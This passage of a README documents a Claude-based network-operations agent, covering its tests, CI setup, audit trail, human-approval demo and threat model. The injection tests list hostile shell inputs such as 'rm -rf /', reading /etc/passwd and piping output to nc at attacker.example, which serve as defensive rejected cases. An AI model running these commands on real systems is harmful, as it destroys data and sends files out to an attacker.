ATTACKS = [
    "leaf1; rm -rf /",
    "leaf1 && cat /etc/passwd",
    "leaf1 | nc attacker.example 4444",
    "leaf1`whoami`",
    "leaf1$(id)",
    # ... 18 more
]

@pytest.mark.parametrize("attack", ATTACKS)
def test_validate_host_rejects(attack):
    from tools.validation import validate_host
    with pytest.raises(ValueError):
        validate_host(attack)


def test_validate_host_accepts_legit():
    assert validate_host("spine1") == "spine1"
    assert validate_host("10.0.0.1") == "10.0.0.1"
```

23 adversarial inputs, every one rejected. Plus positive tests for legit hostnames + IPs.

### 8.2 `tests/test_eval.py` — agent reasoning

```python
def test_scenario_who_is_asn_13335(tool_handler):
    result = tool_handler("peeringdb_lookup", {"asn": 13335})
    data = json.loads(result)
    assert data["found"] is True
    assert "cloudflare" in data["name"].lower()


def test_scenario_check_bgp_on_leaf1(tool_handler):
    result = tool_handler("get_bgp_summary", {"host": "leaf1"})
    assert "Established" in result or "Neighbor" in result


def test_scenario_injection_attempt_is_blocked(tool_handler):
    result = tool_handler("get_bgp_summary", {"host": "leaf1; rm -rf /"})
    assert "untrusted" in result.lower() or "error" in result.lower()
```

8 scenarios. Given a tool dispatch, the result must contain expected keywords. This is the **regression suite for agent reasoning**, not just code correctness. If we change validate_host and it stops rejecting injection, the test fails.

### 8.3 `tests/conftest.py` — fixtures

```python
import os
os.environ.setdefault("MOCK_MODE", "true")

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))
```

Forces `MOCK_MODE=true` for every test → no live API calls. Adds repo root to `sys.path` so `from tools.* import *` works in tests.

---

## 9. CI pipeline

`.github/workflows/ci.yml`:

```yaml
env:
  MOCK_MODE: "true"

jobs:
  lint:
    - run: pip install ruff
    - run: ruff check .

  test:
    - run: pip install jinja2 requests pytest pydantic
    - run: pytest tests/test_injection.py tests/test_agent.py -v
```

CI never touches Anthropic API, PeeringDB, or Cloudflare RPKI — `MOCK_MODE=true` is set at the workflow level. Tests run offline, deterministic, fast (<10s).

---

## 10. Operational walkthrough

### 10.1 Run the agent (lab mode)

```bash
$ source .env  # sets ANTHROPIC_API_KEY
$ python agent.py "Check BGP neighbors on leaf1 and explain anything unusual"

>>> Check BGP neighbors on leaf1 and explain anything unusual

[Claude turn 1: stop_reason="tool_use"]
  → tool_use: get_bgp_summary(host="leaf1")
  → tool_handler dispatches:
    → validate_host("leaf1") OK
    → query_clickhouse("peer_events_for_host", host="leaf1", minutes=5) → 4 events
    → format as summary
  → audit.jsonl line written
  → returns formatted summary

[Claude turn 2: stop_reason="end_turn"]
  → final text:
    "leaf1 has 2 BGP peers (10.10.1.1, 10.10.3.1), both currently Established.
     I noticed one peer-down event at 14:22:45 followed by a peer-up at 14:22:58 —
     a brief 13-second outage. Recommend checking BFD logs for that window."
```

### 10.2 Check the audit + cost trails

```bash
$ cat audit.jsonl | jq .
{
  "id": "...",
  "ts": "2026-05-16T14:25:11Z",
  "session_id": "abc-...",
  "tool": "get_bgp_summary",
  "input": {"host": "leaf1"},
  "result_preview": "BGP state for leaf1 (from clab-obs-telemetry BMP feed)...",
  "duration_ms": 142.3,
  "decision": "auto"
}

$ cat telemetry.jsonl | jq .
{
  "ts": "2026-05-16T14:25:09Z",
  "session_id": "abc-...",
  "input_tokens": 487,
  "output_tokens": 156,
  "cost_usd": 0.003801
}
{
  "ts": "2026-05-16T14:25:14Z",
  "session_id": "abc-...",
  "input_tokens": 731,
  "output_tokens": 89,
  "cost_usd": 0.003528
}

$ jq -s 'map(.cost_usd) | add' telemetry.jsonl
0.007329
```

This query cost $0.0073. The session_id ties tool calls to Claude turns to cost — full traceability.

### 10.3 Run the HITL demo

```bash
$ python scripts/hitl_demo.py
Proposed change staged: approvals/f3a8b21.json
Summary: Add leaf3 with eBGP sessions to spine1/spine2
Target:  leaf3
Impact:  medium

Diff preview:
────────────────────────────────────────────────────────────
hostname leaf3
router bgp 4200000005
  neighbor 10.10.5.1 remote-as 4200000001
  ...
────────────────────────────────────────────────────────────

Operator action:
  python -c "from tools.hitl import approve; approve('f3a8b21', reviewer='pradeep')"
  python -c "from tools.hitl import deny;    deny('f3a8b21',    reviewer='pradeep', note='REASON')"

Polling for decision (Ctrl-C to abort)...
```

In another terminal:
```bash
$ python -c "from tools.hitl import approve; approve('f3a8b21', reviewer='pradeep')"
```

Back in the demo:
```
Decision: approved
→ would now call deploy.py / push to git / etc.
```

### 10.4 Set up Claude Desktop integration

Edit `~/Library/Application Support/Claude/claude_desktop_config.json`:
```json
{
  "mcpServers": {
    "network-ops": {
      "command": "python3",
      "args": ["/Users/Pradep/Documents/.../clab-ai-mcp/mcp_server.py"],
      "env": {
        "MOCK_MODE": "true"
      }
    }
  }
}
```

Restart Claude Desktop. Open a new chat. Type "list available tools" — you should see all 7 tools from `mcp_server.py`. Now Claude can use them in any conversation.

---

## 11. Threat model — what could go wrong

See [`docs/THREAT_MODEL.md`](THREAT_MODEL.md). STRIDE analysis:

### Highlights

- **Critical boundary**: Anthropic API → tool_use schemas. The LLM's output becomes input to our dispatcher. Treat as adversarial.
- **23 injection patterns covered** in `tests/test_injection.py`
- **No `shell=True`** anywhere. List-arg subprocess only.
- **MCP stdio has no auth.** Documented limitation. ADR 0002 explains why allowlist is sufficient at this trust boundary.
- **Approvals are not cryptographically signed** — file tampering possible by anyone with FS access. Production needs HMAC.

### Known gaps deliberately accepted

- No agent-loop max_iterations beyond 20 (could still loop expensive prompts; per-Anthropic-call rate limit is server-side)
- No rate limit at the agent dispatcher level
- MCP stdio inherits parent-process privileges (no isolation)
- File-based approval queue (no DB durability across host crashes)

---

## 12. What this repo deliberately doesn't do

POC-vs-fleet trade-offs:

- **No fine-tuning.** Uses stock claude-sonnet-4-6 with prompt engineering.
- **No RAG over org docs.** Production agent would have a vector store of runbooks, RFCs, NetBox docs.
- **No multi-turn memory across sessions.** Each `python agent.py "..."` is isolated.
- **No prompt versioning.** Changing the system prompt loses replay-ability.
- **No A/B / shadow mode.** Can't run the agent against a real fabric in parallel with a human and compare decisions.
- **No comparison benchmark vs deterministic CLI.** "Agent answered 10 questions in 45s for $0.30 vs vtysh scripts in 5s for $0" — useful framing not yet measured.
- **HITL is file-based**, not Slack/PagerDuty/ServiceNow.
- **Cost telemetry is per-turn, not per-task** (a task spans many turns).

---

## 13. What to read next

1. [`tools/validation.py`](../tools/validation.py) — the security boundary, 30 lines
2. [`tools/clickhouse_tool.py`](../tools/clickhouse_tool.py) — parameterized allowlist, the architectural showpiece
3. [`tests/test_injection.py`](../tests/test_injection.py) — 23 adversarial patterns
4. [`tests/test_eval.py`](../tests/test_eval.py) — agent reasoning regression suite
5. [`scripts/hitl_demo.py`](../scripts/hitl_demo.py) — end-to-end HITL flow
6. [`docs/THREAT_MODEL.md`](THREAT_MODEL.md) — STRIDE
7. [`docs/adr/`](adr/) — MCP-vs-LangChain, allowlist-vs-sandbox, MOCK_MODE+audit
8. **Sibling repos:**
   - [`clab-fabric-evpn`](https://github.com/pradeepbc86/clab-fabric-evpn) — the BGP fabric we observe
   - [`clab-observability`](https://github.com/pradeepbc86/clab-observability) — the ClickHouse `query_clickhouse` connects to
   - [`clab-automation`](https://github.com/pradeepbc86/clab-automation) — the deploy pipeline our HITL proposals would feed into
